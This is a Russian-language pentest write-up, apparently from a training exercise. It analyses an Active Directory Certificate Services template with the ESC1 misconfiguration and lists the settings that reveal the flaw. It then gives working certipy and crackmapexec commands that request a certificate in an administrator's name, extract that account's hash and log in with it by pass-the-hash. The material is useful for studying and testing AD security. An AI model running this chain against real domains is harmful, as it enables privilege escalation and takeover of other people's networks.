Анализ шаблона сертификата, который был получен в ходе тестирования к AD CS от имени пользователя, состоящего в группе Domain Users
---

***Какая уязвимость скрыта в нём?***

AD CS ESC1 (Active Directory Certificate Services Escalation of Privilege 1)

Из-за чего возникает эта уязвимость?
1. Если шаблону сертификата не требуется подтверждение от менеджера 
2. Если позволяет пользователям с низкими привилегиями (Domain users, authenticated users) регистрироваться в шаблоне или получать сертификат
3. Если разрешает пользователю самостоятельно указывать, для какого субъекта будет выпущен сертификат (то есть сфабриковать имя, на которое мы выпустим сертификат в итоге)

По каким признаками это понятно? 
1. Requires Manager Approval           : False
2. Enrollment Permissions
   - Enrollment Rights               : PENTEST.LOCAL\Authenticated Users
3. Enrollee Supplies Subject           : True

***Пример команды для её эксплуатации:***
(буду использовать certipy)
1. Получаем сертификат
```python
 certipy req -u usuall@user.local -p 'usuall_user_password' -ca Antique_CA -target <CAHostname> -template ForClient -upn admin@user.local -dns <DNSServer>
```
-target <CAHostname> - нам дан только Certificate Template, а информацию о DNS name нужно смотреть в Cartificate Authorities
-dns <DNSServer> - DNS сервер нам также не дали, надо смотреть в Cartificate Authorities
2. Получаем хеш
```python
 certipy auth -pfx <cerf_file_name.pfx> -dc-ip <Dc-IP> 
```
-pfx <cerf_file_name.pfx - имя файла, которое получим из вывода первой команды
-dc-ip <Dc-IP> - айпишник сервера 
3. Логинимся на target machine (тут можно использовать crackmapexec)
```python
 crackmapexec smb <ip_of_the_target> -u admin -H :<hash_that_we_got> --shares
```
